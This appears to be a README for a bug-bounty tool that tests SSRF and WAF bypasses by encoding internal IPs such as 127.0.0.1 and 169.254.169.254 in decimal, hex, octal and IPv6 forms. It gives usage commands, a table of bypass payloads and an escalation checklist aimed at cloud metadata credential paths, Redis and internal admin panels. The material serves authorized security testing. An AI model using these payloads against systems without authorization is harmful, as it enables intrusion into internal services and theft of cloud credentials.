IP Bypass Tester 🔓

SSRF & WAF Bypass via IP Encoding — Bug Bounty Tool
By Rishu Raj Singh | Patliputra Anveshan Labs
HackerOne: rishusec

What Is This?

Many web applications block access to internal IPs (127.0.0.1, 169.254.169.254, etc.) using simple string checks — but the same IP can be represented in dozens of ways that bypass those checks.

This tool automates testing all known IP encoding bypass techniques for:

SSRF (Server-Side Request Forgery) — reaching internal services
WAF bypass — evading IP-based firewall rules
Cloud metadata access — AWS IMDSv1, GCP, Azure
IP allowlist bypass — accessing endpoints restricted to specific IPs
Bypass Techniques Tested
Technique	Example (127.0.0.1)
Decimal	2130706433
Hexadecimal (no dots)	0x7f000001
Hexadecimal (with dots)	0x7f.0x0.0x0.0x1
Octal	0177.0.0.01
Mixed hex/decimal	0x7f.0.0.1
IPv6 mapped	::ffff:127.0.0.1
IPv6 hex mapped	::ffff:7f00:0001
Long decimal	127.000.000.001
URL encoded dots	127%2e0%2e0%2e1
Double URL encoded	127%252e0%252e0%252e1
Short form	127.1
DNS rebinding	127.0.0.1.nip.io
AWS metadata decimal	2852039166
Installation
bash
git clone https://github.com/Rishurajsing/ip-bypass-tester
cd ip-bypass-tester
pip3 install requests --break-system-packages

Requirements: Python 3.6+ | requests library

Usage
1. Test SSRF Endpoint

Use INJECT as placeholder where the IP goes in the URL:

bash
python3 ip_bypass_tester.py --url "https://target.com/api/fetch?url=INJECT"
2. Test Specific Internal IP
bash
python3 ip_bypass_tester.py --url "https://target.com/api/fetch?url=INJECT" --ip 192.168.1.100
3. Just Convert an IP (no target needed)
bash
python3 ip_bypass_tester.py --convert 169.254.169.254

Output:

All representations of 169.254.169.254:

  Standard                       169.254.169.254
  Decimal                        2852039166
  Hex (no dots)                  0xa9fea9fe
  Hex (with dots)                0xa9.0xfe.0xa9.0xfe
  Octal                          0251.0376.0251.0376
  IPv6 mapped                    ::ffff:169.254.169.254
  ...
4. Verbose Mode (see all requests)
bash
python3 ip_bypass_tester.py --url "https://target.com/api/fetch?url=INJECT" --verbose
What It Tests

The tool runs 4 test categories automatically:

Step	Category	Payloads
1	Baseline	External IP (8.8.8.8) to see blocked response
2	Localhost bypass	15+ variants of 127.0.0.1, ::1, 0.0.0.0
3	Cloud metadata	AWS 169.254.169.254, GCP, Azure in all encodings
4	Private ranges	10.x, 192.168.x, 172.16.x in decimal/hex
5	Custom IP	All encoding variants of --ip if specified
How Bypass Detection Works

The tool compares each response against a baseline (blocked IP):

Status code changed (e.g., 403 → 200) → BYPASS
Response size dramatically larger → BYPASS
SSRF content detected in response (ami-id, meta-data, /bin/bash) → BYPASS
Example Output
[BYPASS] BYPASS FOUND [127.0.0.1 decimal]: 2130706433
         Reason: status changed: 403 → 200
         URL: https://target.com/api/fetch?url=2130706433

[BYPASS] BYPASS FOUND [AWS metadata decimal]: 2852039166
         Reason: SSRF content detected: 'ami-id' in response
Manual Testing Checklist

After finding a bypass with this tool, escalate impact:

□ Try AWS metadata: /latest/meta-data/iam/security-credentials/
□ Try GCP metadata: /computeMetadata/v1/instance/service-accounts/
□ Try Redis: redis://INJECT:6379
□ Try Elasticsearch: INJECT:9200/_cat/indices
□ Try internal admin panels: INJECT:8080/admin
□ Test POST body injection (not just GET params)
□ Test HTTP headers: X-Forwarded-For, X-Real-IP, Host
Real Bug Bounty Findings Using These Techniques
Target	Finding	Severity
Various	SSRF via decimal IP bypass to AWS metadata	Critical/P1
Various	WAF bypass to internal admin via octal IP	High/P2
Various	IPv6-mapped bypass to localhost service	High/P2
Ethical Use

This tool is for authorized security research only.

Only test applications you have permission to test
Respect bug bounty program scope and rules
Do not use against production systems without written authorization
Author

Rishu Raj Singh
Independent Bug Bounty Researcher | Patliputra Anveshan Labs

🌐 anveshanlabs.in
✍️ medium.com/@rishuraj2666
🐛 HackerOne: rishusec
💼 LinkedIn
📺 YouTube: Patliputra Anveshan Labs
License

MIT License — free to use, modify, and distribute with attribution.
